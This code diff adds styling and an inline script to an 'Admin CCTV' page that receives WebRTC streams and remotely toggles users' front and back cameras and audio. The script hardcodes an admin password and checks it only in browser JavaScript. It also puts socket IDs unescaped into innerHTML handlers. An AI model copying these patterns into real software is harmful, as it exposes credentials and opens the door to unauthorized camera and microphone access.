@@ -2,12 +2,180 @@
 <html>
 <head>
   <title>Admin CCTV</title>
+
+  <style>
+    body {
+      font-family: Arial;
+      background: #111;
+      color: #fff;
+      text-align: center;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+    }
+
+    #videos {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+    }
+
+    .camera-box {
+      background: #222;
+      padding: 10px;
+      border-radius: 10px;
+      width: 320px;
+    }
+
+    video {
+      width: 100%;
+      border-radius: 10px;
+      background: black;
+    }
+
+    button {
+      margin: 5px;
+      padding: 6px 10px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .front { background: #4CAF50; }
+    .back { background: #2196F3; }
+    .both { background: #9C27B0; }
+    .audio-on { background: #FF9800; }
+    .audio-off { background: #f44336; }
+  </style>
+
 </head>
+
 <body>
-  <h1>Admin Panel – Live Cameras</h1>
+
+  <h1>📡 Admin Panel – Live Cameras</h1>
+
   <div id="videos"></div>
 
-  <script src="https://cdn.socket.io/4.8.3/socket.io.min.js" integrity="sha384-kzavj5fiMwLKzzD1f8S7TeoVIEi7uKHvbTA3ueZkrzYq75pNQUiUi6Dy98Q3fxb0" crossorigin="anonymous"></script>
-  <script src="admin.js"></script>
+  <!-- Socket -->
+  <script src="https://cdn.socket.io/4.8.3/socket.io.min.js"
+    integrity="sha384-kzavj5fiMwLKzzD1f8S7TeoVIEi7uKHvbTA3ueZkrzYq75pNQUiUi6Dy98Q3fxb0"
+    crossorigin="anonymous"></script>
+
+  <!-- Admin Script -->
+  <script>
+    console.log("ADMIN PAGE LOADED");
+
+    const password = "Linux@2025%";
+    const userEnteredPassword = prompt("Enter Admin Password");
+
+    if (password !== userEnteredPassword) {
+      alert("Wrong password");
+      window.location.href = "/";
+    }
+
+    const socket = io();
+    const container = document.getElementById("videos");
+    const peers = {};
+
+    socket.emit("register", {
+      role: "admin",
+    });
+
+    // 🔥 RECEIVE NEW USER
+    socket.on("new-user", async ({ socketId, cameraId }) => {
+      console.log("📹 New user:", socketId);
+
+      const wrapper = document.createElement("div");
+      wrapper.className = "camera-box";
+
+      const label = document.createElement("h4");
+      label.innerText = cameraId;
+
+      const video = document.createElement("video");
+      video.autoplay = true;
+      video.playsInline = true;
+      video.controls = true;
+
+      // 🎛 CONTROL BUTTONS
+      const controls = document.createElement("div");
+
+      controls.innerHTML = `
+        <button class="front" onclick="sendControl('${socketId}', 'front')">Front</button>
+        <button class="back" onclick="sendControl('${socketId}', 'back')">Back</button>
+        <button class="both" onclick="sendControl('${socketId}', 'both')">Both</button>
+        <br/>
+        <button class="audio-on" onclick="sendControl('${socketId}', 'audio-on')">Audio ON</button>
+        <button class="audio-off" onclick="sendControl('${socketId}', 'audio-off')">Audio OFF</button>
+      `;
+
+      wrapper.appendChild(label);
+      wrapper.appendChild(video);
+      wrapper.appendChild(controls);
+
+      container.appendChild(wrapper);
+
+      // 🔗 CREATE PEER
+      const peer = new RTCPeerConnection({
+        iceServers: [{ urls: "stun:stun.l.google.com:19302" }],
+      });
+
+      peers[socketId] = peer;
+
+      // 🔥 RECEIVE TRACKS
+      peer.ontrack = (e) => {
+        console.log("🎥 Track received from", socketId);
+        video.srcObject = e.streams[0];
+      };
+
+      // ICE
+      peer.onicecandidate = (e) => {
+        if (e.candidate) {
+          socket.emit("signal", {
+            to: socketId,
+            data: e.candidate,
+          });
+        }
+      };
+
+      // 🔥 IMPORTANT
+      peer.addTransceiver("video", { direction: "recvonly" });
+      peer.addTransceiver("audio", { direction: "recvonly" });
+
+      // OFFER
+      const offer = await peer.createOffer();
+      await peer.setLocalDescription(offer);
+
+      socket.emit("signal", {
+        to: socketId,
+        data: offer,
+      });
+    });
+
+    // 🔁 SIGNALING
+    socket.on("signal", async ({ from, data }) => {
+      const peer = peers[from];
+      if (!peer) return;
+
+      if (data.type === "answer") {
+        await peer.setRemoteDescription(data);
+      } else if (data.candidate) {
+        await peer.addIceCandidate(data);
+      }
+    });
+
+    // 🎛 CONTROL FUNCTION
+    function sendControl(userId, action) {
+      console.log("🎛 Sending:", action);
+
+      socket.emit("control", {
+        to: userId,
+        action
+      });
+    }
+
+  </script>
+
 </body>
 </html>
